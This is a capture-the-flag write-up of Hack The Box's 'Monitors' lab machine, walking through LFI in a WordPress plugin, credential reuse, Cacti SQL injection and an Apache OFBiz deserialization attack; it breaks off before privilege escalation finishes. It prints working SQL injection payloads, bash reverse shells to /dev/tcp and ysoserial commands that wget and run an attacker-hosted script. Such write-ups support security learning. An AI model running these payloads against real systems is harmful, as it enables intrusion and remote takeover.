---
title: Monitors - Hack The Box
categories: [Linux, Apache, Virtual Hosting, WordPress, Fuzzing, WP with Spritz, Remote File Inclusion, RFI, Reverse Shell, Local File Inclusion, LFI, Cacti, SQL Injection, Docker, Container, Local Port Forwarding, Apache OFBiz, Deserialization, CommonsBeanutils1, Docker Breakout, Capability, CAP_SYS_MODULE, Kernel Module]
published: true
lang: en
---

![Info Card](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/1.png){:class="blog-image" onclick="expandImage(this)"}

Today we will be solving _Hack The Box’s_ _Monitors_ machine. It is a hard-level _Linux_ machine, as listed on the platform. Despite its difficulty, there’s no reason to feel intimidated, as it covers various techniques and vulnerabilities, making it an excellent opportunity to learn and practice, all detailed step by step.

### [](#header-3)Reconnaissance Phase

First, we’re going to launch an _ICMP traceroute_ to check if the machine is active.

```
ping -c 1 10.10.10.238
```

![2](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/2.png){:class="blog-image" onclick="expandImage(this)"}


Once we verify that the machine is active (as it returns a response), we can also determine what type of machine we are dealing with based on the _TTL_ value; in this case, the machine’s _TTL_ value is `63`, so we can infer that we are dealing with a _Linux_ machine. Remember, some of the reference values are as follows:

| Operating System (OS)  | TTL |
|:-----------------------|:----|
| Linux                  | 64  |
| Windows                | 128 |
| Solaris                | 254 | 

If we notice, in this case, the _TTL_ value is `63` instead of `64` as indicated in the table above. This is because, in the _Hack The Box_ environment, we are not communicating directly with the target machine; instead, there is an intermediary node, which causes the _TTL_ to decrease by one unit.

```
ping -c 1 10.10.10.238 -R
``` 

![3](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/3b.png){:class="blog-image" onclick="expandImage(this)"}

Next, we will use the _Nmap_ tool to determine which ports are open, as well as identify the version and services running on the asset. To determine which ports are open, we can do the following:

```bash
nmap -p- --open -T5 -v -n 10.10.10.238
```

If the scan takes too long to complete, we have this alternative:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.238
```

Below is an explanation of the parameters used in the port scan with _Nmap_:

| Parameter | Explanation |
|:----------|:------------|
| \-p\- | Scans the entire range of ports (65535 in total) |
| \-\-open | Shows all ports that are open (or possibly open) |
| \-T5 | The timing template allows us to speed up our scan; this value can range from 0 to 5. Note that the higher the value of the template, the more "noise" we generate, but that’s okay, right? After all, we’re practicing in a controlled environment, and here we are all `White Hat` | 
| \-v | _Verbose_, reports findings to the console |
| \-n | Do not apply _DNS resolution_ |
| \-sS | _TCP SYN_ scan |
| \-min-rate | Send packets no slower than \<value\> per second |
| \-vvv | Triple _verbose_, to get more information in the console |
| \-Pn | Do not apply _host discovery_ |

Once we have detected the open ports on the asset, we can move on to determine the version and services running on these ports.

```bash
nmap -sC -sV -p 22,80 10.10.10.238
```

Below is an explanation of the parameters used in the version and service scan with _Nmap_:

| Parameter | Explanation |
|:----------|:------------|
| \-sC | Basic enumeration scripts |
| \-sV | Version and services running on the found ports |
| \-p | Specify which ports we want to analyze (those found open in the previous step) |

Based on the information reported by _Nmap_, we can see that the victim machine has open ports related to `SSH` (22) and `HTTP` (80).

### [](#header-3)Exploitation Phase

To enumerate the `HTTP` service, we will use `WhatWeb`, a tool that identifies the web technologies in use. This includes content management systems (CMS), libraries, plugins, or even the operating system hosting the web server.

```
whatweb http://10.10.10.238
```

The scan returns a `403 Forbidden` status code, indicating that direct access is restricted. However, we can see that the server is running `Apache 2.4.29` as the web server and it also reveals an email address, although this information does not directly provide much else.

![4](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/4.png){:class="blog-image" onclick="expandImage(this)"}

Since we can't obtain any more useful information from the terminal, we will need to visit the page from our browser. Upon access, we observe a message indicating that direct access by IP is not allowed, and it suggests contacting the site administrator via an email address with the domain `monitors.htb`. This detail is relevant as the domain in the email address could be a clue indicating the use of `virtual hosting`; that is, the server uses specific domain names to identify hosted sites.

![5](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/5.png){:class="blog-image" onclick="expandImage(this)"}

To verify this, we will edit the `/etc/hosts` file so that the domain name resolves to the IP address of the corresponding server.

![6](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/6.png){:class="blog-image" onclick="expandImage(this)"}

Once this change is made, after re-running our `Nmap` and `WhatWeb` scans, we now obtain much more information:

![7](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/7.png){:class="blog-image" onclick="expandImage(this)"}

![8](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/8.png){:class="blog-image" onclick="expandImage(this)"}

The most relevant findings from this new scan are that the server is using `WordPress 5.5.1`, which allows us to identify the content management system in use, and confirms that the server is running on `Ubuntu`.

After spending some time exploring the page, we did not find anything of particular interest. However, knowing that the site uses `WordPress`, we can search for common paths such as admin panels, content directories, and other typical _CMS_ routes.

![9](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/9.png){:class="blog-image" onclick="expandImage(this)"}

In my case, I decided to apply _fuzzing_ to find these potential paths.

```
wfuzz -c -L -t 400 --hc 404 --hh 12759 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://monitors.htb/FUZZ
```

![10](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/10.png){:class="blog-image" onclick="expandImage(this)"}

Among the paths found, we discovered the `wp-admin` panel; however, attempting to access it with default known credentials will not be effective in this case.

![11](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/11.png){:class="blog-image" onclick="expandImage(this)"}

We also discovered that the `wp-content` directory is accessible, which represents a configuration error, as this directory contains _CMS_ resources that should be protected. Within this directory, we can perform a second _fuzzing_ (or alternatively, we could manually search for specific paths), which leads us to the `plugins` directory.

```
wfuzz -c -L -t 400 --hc 404 --hh 0 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://monitors.htb/wp-content/FUZZ
```

![12](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/12.png){:class="blog-image" onclick="expandImage(this)"}

Here, we find the `wp-with-spritz` plugin.

![13](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/13.png){:class="blog-image" onclick="expandImage(this)"}

![14](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/14.png){:class="blog-image" onclick="expandImage(this)"}

By downloading its `readme.txt` file and reviewing it, we confirm that version 1.0 of this plugin is in use.

![15](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/15.png){:class="blog-image" onclick="expandImage(this)"}

With this information, we can proceed to investigate whether this version has any known vulnerabilities that we can exploit. We can do this directly from the console using `searchsploit`, or by searching online on _Exploit Database_.

```
searchsploit spritz
```

![16](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/16.png){:class="blog-image" onclick="expandImage(this)"}

We find an exploit for this version that exploits a `Remote File Inclusion` (RFI) vulnerability.

![17](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/17.png){:class="blog-image" onclick="expandImage(this)"}

To test this, we can create any text file and, using _Python_, we can host an _HTTP_ server from the same file path to make it accessible via:

```
python3 -m http.server 80
```

Now, if we point to the URL below, we will see that we can read the contents we wrote in our text file.

```
http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=http://<ourIP>:80/<nombreArchivo>
```

![18](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/18.png){:class="blog-image" onclick="expandImage(this)"}

However, if we try to load a _reverse shell_, it will not execute because the `RFI` uses the `file_get_contents` function, which simply reads the file content as text, without interpreting or executing any _PHP_ code it contains.

![19](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/19.png){:class="blog-image" onclick="expandImage(this)"}

However, even though we cannot exploit this `RFI`, we can take advantage of the `Local File Inclusion` (LFI) vulnerability, which we already explained in a [previous article](https://mateonitro550.github.io/en/Local-File-Inclusion-(LFI)/). We confirm that we have read access, as we manage to list the contents of `/etc/passwd`.

```
http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../../../../etc/passwd
```

![20](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/20.png){:class="blog-image" onclick="expandImage(this)"}

Reading this file from the browser can be tricky, so we could use `Ctrl + U` to view it more effectively.

![21](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/21.png){:class="blog-image" onclick="expandImage(this)"}

Since we have access to files on the system, the next logical step is to search for important configuration files. For example, the `wp-config.php` file from `WordPress` often contains sensitive information, such as the username, password, and database name required for `WordPress` to connect to its database. This file is usually located in `/var/www/wordpress`, so we could access this path to read its contents.

```
http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../../../../var/www/wordpress/wp-config.php
```

![22](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/22.png){:class="blog-image" onclick="expandImage(this)"}

Although we can try these credentials in the `wp-admin` panel, they will not allow us to log in.

![23](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/23.png){:class="blog-image" onclick="expandImage(this)"}

The next step is to explore the `Apache` configuration files. `Apache` is installed by default in `/etc/apache2/`, so we can try reading the `apache2.conf` file, which is the main configuration file for the web server. Additionally, this file provides a basic view of the hierarchical structure of its configuration files, which suggests potential paths to look for other interesting files.

To better understand this hierarchy and adapt to the specific configurations of this server, we can refer to this [documentation](https://cwiki.apache.org/confluence/display/httpd/DistrosDefaultLayout#DistrosDefaultLayout-Debian,Ubuntu(Apachehttpd2.x):). It's important to note that, as we observed earlier, `Apache` is running on `Ubuntu`, so its configuration may differ from other operating systems, where certain paths or configuration files might be located elsewhere.

![24](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/24.png){:class="blog-image" onclick="expandImage(this)"}

Whether because we suspect there might be additional configurations or because we've carefully examined `Apache's` configuration files, we find clues about the possible existence of additional domains. For instance, in the `ports.conf` file, it mentions that any port changes or additions may require adjustments to the _VirtualHost_ statement in `/etc/apache2/sites-enabled/000-default.conf`. This reminds us that the server has been applying `virtual hosting` from the start, which could indicate the presence of domains we are not aware of yet.

```
http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../../../../etc/apache2/ports.conf
```

![25](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/25.png){:class="blog-image" onclick="expandImage(this)"}

By examining the `000-default.conf` file, we discover that the server is indeed hosting a second domain. We also notice that this configuration is the one used for default access when no specific domain is applied, showing the same message we saw when trying to access by IP, where it tells us that direct access is restricted.

```
http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../../../../etc/apache2/sites-enabled/000-default.conf
```

![26](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/26.png){:class="blog-image" onclick="expandImage(this)"}

Since `Apache` organizes virtual site configurations in the `/etc/apache2/sites-available/` directory, this is where we look for the _.conf_ files that define each domain. When reviewing `monitors.htb.conf`, we see that the domain `monitors.htb` has its root set to `/var/www/wordpress`, just as we initially assumed when identifying the use of `WordPress`.

```
http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../../../../etc/apache2/sites-enabled/monitors.htb.conf
```

![27](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/27.png){:class="blog-image" onclick="expandImage(this)"}

On the other hand, when inspecting `cacti-admin.monitors.htb.conf`, we discover that the domain `cacti-admin.monitors.htb` has its content located in `/usr/share/cacti`.

```
http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../../../../etc/apache2/sites-enabled/cacti-admin.monitors.htb.conf
```

![28](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/28.png){:class="blog-image" onclick="expandImage(this)"}

With this information and knowing about the existence of this second domain, we can also add it to the `/etc/hosts` file and explore what it is about.

![29](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/29.png){:class="blog-image" onclick="expandImage(this)"}

Upon reaching this second domain, `cacti-admin.monitors.htb`, we encounter a login panel for `Cacti`. `Cacti` is a network monitoring tool that allows the collection and graphing of performance data. We can try the credentials we obtained earlier from the `wp-config.php` file, and we see that they work, which highlights another bad security practice: credential reuse.

![30](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/30.png){:class="blog-image" onclick="expandImage(this)"}

Once inside, we notice that we are using version `1.2.12` of `Cacti`, which leads us to investigate if this version has any known vulnerabilities.

![31](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/31.png){:class="blog-image" onclick="expandImage(this)"}

To check, we can search online on _Exploit Database_ or directly from the console using `searchsploit`:

```
searchsploit cacti 1.2.12
```

![32](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/32.png){:class="blog-image" onclick="expandImage(this)"}

This search reveals an [SQL injection](https://mateonitro550.github.io/en/SQL-Injection) vulnerability in one of the application's parameters. Although we could execute the exploit as is, it is more valuable to understand how it works for practicing `SQL injections`.

![33](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/33.png){:class="blog-image" onclick="expandImage(this)"}

In the `Cacti` interface, the vulnerability is located in the `filter` parameter of the following URL:

```
http://cacti-admin.monitors.htb/cacti/color.php?action=export&filter=1
```

This parameter is located in the _Presets_ section of the left menu, under the _Color_ option, which displays a table with a list of colors and their properties. By manipulating this parameter, we can inject SQL commands and alter the queries to the database.

![34](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/34.png){:class="blog-image" onclick="expandImage(this)"}

We will start by injecting the classic payload `')+UNION+SELECT+NULL;--+-` to calculate the number of columns in the query.

```
http://cacti-admin.monitors.htb/cacti/color.php?action=export&filter=1')+UNION+SELECT+NULL;--+-
```

![35](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/35.png){:class="blog-image" onclick="expandImage(this)"}

We will continue adding `NULL` until we find the correct number of columns, and by adding seven `NULL`, we manage to download a _CSV_ file named _colors.csv_. This confirms that the original SQL query has seven columns.

```
http://cacti-admin.monitors.htb/cacti/color.php?action=export&filter=1')+UNION+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL;--+-
```

![36](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/36.png){:class="blog-image" onclick="expandImage(this)"}

Now we are interested in listing all the tables in the database; for this, we will use the following _payload_:

```
http://cacti-admin.monitors.htb/cacti/color.php?action=export&filter=1')+UNION+SELECT+NULL,table_name,NULL,NULL,NULL,NULL,NULL+FROM+information_schema.tables;--+-
```

![37](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/37.png){:class="blog-image" onclick="expandImage(this)"}

Among the listed tables, we identify one of interest called `user_auth`. We proceed to discover the names of its columns with the following injection:

```
http://cacti-admin.monitors.htb/cacti/color.php?action=export&filter=1')+UNION+SELECT+NULL,column_name,NULL,NULL,NULL,NULL,NULL+FROM+information_schema.columns+WHERE+table_name='user_auth';--+-
```

![38](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/38.png){:class="blog-image" onclick="expandImage(this)"}

Among the columns, we are interested in `username` and `password`. Using the following injection, we will list the values of these columns:

```
http://cacti-admin.monitors.htb/cacti/color.php?action=export&filter=1')+UNION+SELECT+NULL,username,password,NULL,NULL,NULL,NULL+from+user_auth;--+-
```

This reveals two users: _admin_ and _guest_, although their passwords are hashed.

![39](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/39.png){:class="blog-image" onclick="expandImage(this)"}

However, there is a second injection that allows us to obtain a _reverse shell_ inside the machine. This injection is performed as follows:

```
http://cacti-admin.monitors.htb/cacti/color.php?action=export&filter=1')+UPDATE+settings+SET+value='bash -i >& /dev/tcp/<ourIP>/443 0>&1;'+WHERE+name='path_php_binary';--+-
```

By modifying the `path_php_binary` parameter in the _settings_ table to point to a _reverse shell_ instead of the PHP executable, we manage to execute our command. This happens because `Cacti` uses the value of this parameter in the `host_reindex()` function, located in the file [host.php](https://github.com/Cacti/cacti/blob/develop/host.php). The logic behind this is as follows:

```php
switch (get_request_var('action')) {
	case 'reindex':
		host_reindex();

		header('Location: host.php?action=edit&id=' . get_request_var('host_id'));

		break;
}
```

When the _action_ parameter is equal to `reindex`, the `host_reindex()` function is executed, which uses the _shell_exec()_ function to run the command defined in `path_php_binary`. This allows our _reverse shell_ to be executed instead of the legitimate PHP script. The code for the `host_reindex()` function is as follows:

```php
function host_reindex() {    
    global $config;

	$start = microtime(true);

	shell_exec(read_config_option('path_php_binary') . ' -q ' . CACTI_PATH_CLI . '/poller_reindex_hosts.php --qid=all --id=' . get_filter_request_var('host_id'));

	$end = microtime(true);

	$total_time = $end - $start;

	$items = db_fetch_cell_prepared('SELECT COUNT(*)
		FROM host_snmp_cache
		WHERE host_id = ?',
		array(get_filter_request_var('host_id'))
	);

	raise_message('host_reindex', __('Device Reindex Completed in %0.2f seconds.  There were %d items updated.', $total_time, $items), MESSAGE_LEVEL_INFO);
}
```

Once we have modified the `path_php_binary` parameter, we will set our machine to listen using `Netcat` to receive the reverse shell:

```
nc -nlvp 443
```

We can navigate to [http://cacti-admin.monitors.htb/cacti/host.php?action=reindex](http://cacti-admin.monitors.htb/cacti/host.php?action=reindex) or, from the console itself, execute it with:

```
curl http://cacti-admin.monitors.htb/cacti/host.php?action=reindex
```

By doing so, we manage to establish the reverse shell, gaining direct access to the machine. Once inside the machine, we can confirm our presence in the system using the following command:

```
hostname -I
```

This shows us a list of available IP addresses on the machine, including `10.10.10.238`, `172.18.0.1`, and `172.17.0.1`. While we are indeed on the victim machine, the presence of addresses in the `172.16.0.0/12` range suggests network configurations related to `Docker`, as `Docker` typically assigns IP addresses in this range for container internal networks.

![40](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/40.png){:class="blog-image" onclick="expandImage(this)"}

To verify if `Docker` is active on the machine, we can check if the `Docker` socket exists by running:

```
ls -l /var/run/docker.sock
```

This shows that the socket is owned by the user _root_ and the group _docker_, indicating that access to the _Docker daemon_ is restricted to these users and members of the _docker_ group. This means that our current user doesn't have permission to interact with `Docker` directly, so commands like `docker ps` or `docker info` won't be effective.

Another way to confirm if `Docker` is running is to inspect active processes with:

```
ps aux | grep dockerd
```

This command shows that the _dockerd_ process (the `Docker` daemon) is running, confirming that `Docker` is active on the system.

The fact that `Docker` is running on the victim machine is relevant, as it could open up new opportunities for privilege escalation or system exploitation. If we find any running container that is misconfigured or running services with elevated permissions, we could exploit this vulnerability to gain additional privileges or even interact with the host machine's resources from within a container.

![41](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/41.png){:class="blog-image" onclick="expandImage(this)"}

From here, we continue exploring the machine. In the `/home` directory, we find a user `marcus`. If we access his home directory, we find the first flag and a file called `note.txt`; however, both are protected to be read only by the user himself. This suggests that we will eventually need to become the `marcus` user to gain access to the flag and see what the note is about.

Additionally, we discover that in his home directory there is a hidden directory called `.backup`, which catches our attention. Backup directories often contain backup copies that could include sensitive information, such as access credentials or important configurations. However, we cannot read this directory directly since we only have execute (traverse) permissions, meaning we can navigate inside it but cannot list or inspect its contents, and will only be able to access files whose names we know.

![42](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/42.png){:class="blog-image" onclick="expandImage(this)"}

![43](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/43.png){:class="blog-image" onclick="expandImage(this)"}

The fact that there is a backup mechanism on the machine leads us to investigate further, so we perform a recursive search on the system for backup-related files:

```
find /etc /home /lib /opt /tmp /usr /var -type f -iname '*backup*' 2>/dev/null
```

In the results, we find a file called `cacti-backup-service`, which is interesting because it is related to `Cacti`, the system we saw earlier.

![44](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/44.png){:class="blog-image" onclick="expandImage(this)"}

This file defines a service that runs as the _www-data_ user and calls the `backup.sh` script located in the `.backup` directory inside the `marcus` home directory.

![45](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/45.png){:class="blog-image" onclick="expandImage(this)"}

When reviewing the contents of `backup.sh`, we see that the script compresses the `Cacti` files into a ZIP archive, which is then transferred to a remote location using _SSH_. The script provides a password for authentication, which we will attempt to use to connect via `SSH` as the `marcus` user and gain direct access to his account.

![46](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/46.png){:class="blog-image" onclick="expandImage(this)"}

```
ssh marcus@10.10.10.238
```

In this way, we gain access to the `marcus` account and can finally read the first flag.

![47](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/47.png){:class="blog-image" onclick="expandImage(this)"}

### [](#header-3)Privilege Escalation

Once inside as the `marcus` user, we can read the note we had previously found. It refers to the update of the `Docker` image for production use, which confirms the presence of `Docker`, something we had already verified earlier.

![48](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/48.png){:class="blog-image" onclick="expandImage(this)"}

After further exploring the machine, we discover that there are more open ports than we initially recorded with _Nmap_. These ports, known as _internal ports_, are only available locally on the machine itself. Ports `8443` (HTTPS), `3306` (MySQL), and `53` (DNS) are configured to accept connections only from the local address (127.0.0.1), so they are not accessible from outside the machine. On the other hand, ports 22 (SSH) and 80 (HTTP) are the ones we had already seen externally with _Nmap_ and are available for external connections.

```
netstat -nlpt
```

![49](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/49.png){:class="blog-image" onclick="expandImage(this)"}

Out of these ports, we will focus on the web port (`8443`), as it is associated with an `HTTPS` service that is only accessible locally. To access this port from our machine, we will use `local port forwarding`. `Local port forwarding` is a technique where we redirect traffic from a port on our local machine to a port on the remote machine through an `SSH` connection. This allows us to interact with services that are only available locally on the victim machine, such as in this case, the `HTTPS` service on port `8443`.

To achieve this, we run the following command:

```
ssh -L 8443:localhost:8443 marcus@10.10.10.238
```

This command sets up an _SSH tunnel_, forwarding port `8443` on our local machine to port `8443` on the remote machine, which is only locally available. This way, we can access this service from our local browser by simply visiting [https://localhost:8443](https://localhost:8443).

![50](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/50.png){:class="blog-image" onclick="expandImage(this)"}

With the _SSH tunnel_ set up, we successfully connect to the local web port `8443` and start exploring the application. Since we have no clear information about its structure or the type of service running, we can apply _fuzzing_ to discover potential paths and directories.

```
wfuzz -c -L -t 400 --hc 404 --hh 800 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt https://localhost:8443/FUZZ
```

![51](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/51.png){:class="blog-image" onclick="expandImage(this)"}

Among them, the `main` path indicates that we can log in using the username _admin_ and the password _ofbiz_.

![52](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/52.png){:class="blog-image" onclick="expandImage(this)"}

On the other hand, the `bi` and `example` paths lead us to an authentication panel in an `Apache OFBiz` system. When trying to use these credentials, we receive a message stating that the user does not exist. However, the most relevant detail here is that this panel provides the version of `Apache OFBiz` being used: `17.12.01`.

![53](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/53.png){:class="blog-image" onclick="expandImage(this)"}

As we have been doing, we will investigate whether this version of `Apache OFBiz` has any known vulnerabilities that we can exploit. We can do this by searching online, on _Exploit Database_, or directly from the console using `searchsploit`:

```
searchsploit ofbiz 17.12.01
```

![54](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/54.png){:class="blog-image" onclick="expandImage(this)"}

Among the results, we find an exploit that provides _remote code execution_ (`RCE`) via a `deserialization attack`. While we could execute it directly, it is more valuable to understand how it works in order to practice the _deserialization_ process and manually manipulate the exploit, giving us greater control and understanding of the attack.

![55](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/55.png){:class="blog-image" onclick="expandImage(this)"}

First, we will download [ysoserial](https://github.com/frohoff/ysoserial), a tool that allows us to generate serialized _Java_ objects with malicious _payloads_. This is useful in `deserialization attacks`, where by sending a specially crafted _serialized object_, we can execute code on the server if it processes (_deserializes_) the object without proper validation.

Next, we will write a _reverse shell_ in _Bash_. This _reverse shell_ will allow us to gain remote access from the server to our machine. To do this, we will create a file called `shell.sh` with the following content:

```bash
#!/bin/bash
/bin/bash -i >& /dev/tcp/<ourIP>/443 0>&1
```

![56](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/56.png){:class="blog-image" onclick="expandImage(this)"}

Next, we will generate the _payload_ in _JAR_ format, using the `CommonsBeanutils1` class. This class is part of _Apache Commons_ and has been exploited in the past to execute arbitrary code in serialized objects. By using `ysoserial` together with `CommonsBeanutils1`, we can embed commands into a serialized object that the server will execute when it _deserializes_ it. In this case, the _payload_ is designed so that the server will download our `shell.sh` file into the victim machine's temporary directory (`/tmp`). We will encode the output of the _payload_ in `base64` to facilitate transmission and avoid issues during the process:

```
java -jar ysoserial-all.jar CommonsBeanutils1 "wget <ourIP>/shell.sh -O /tmp/shell.sh" | base64 | tr -d "\n"; echo
```

![57](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/57.png){:class="blog-image" onclick="expandImage(this)"}

To make the `shell.sh` file available and downloadable on the victim machine, we will start a local HTTP server using _Python_:

```
python3 -m http.server 80
```

With this server running, we can now send our first _payload_ to the target server. We will use `curl` to send a request to the `webtools/control/xmlrpc` endpoint on port `8443`. This request includes the _base64_-encoded _payload_ inside the `<serializable>` tag. When the request is processed, the server will deserialize the object and download the reverse shell script.

```
curl -s https://127.0.0.1:8443/webtools/control/xmlrpc -X POST -d "<?xml version='1.0'?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value><struct><member><name>test</name><value><serializable xmlns='http://ws.apache.org/xmlrpc/namespaces/extensions'> PAYLOAD </serializable></value></member></struct></value></param></params></methodCall>" -k  -H 'Content-Type:application/xml' &>/dev/null
```

Here, `PAYLOAD` is the `base64` content that we generated in the previous step.

![58](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/58.png){:class="blog-image" onclick="expandImage(this)"}

After sending the initial _payload_ to download `shell.sh`, we will generate a second _payload_ in _JAR_ format that will execute this file on the server. This second _payload_ will be generated using the same `base64` encoding process:

```
java -jar ysoserial-all.jar CommonsBeanutils1 "bash /tmp/shell.sh" | base64 | tr -d "\n"; echo
```

![59](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/59.png){:class="blog-image" onclick="expandImage(this)"}

Before sending this second _payload_, we will set our machine to listen using `Netcat` to receive the _reverse shell_:

```
nc -nlvp 443
```

Finally, we send the second _payload_ using `curl` in the same way as the first one. Once this request is executed, the server will run the `shell.sh` file and we will obtain a _reverse shell_ within the victim machine.

```
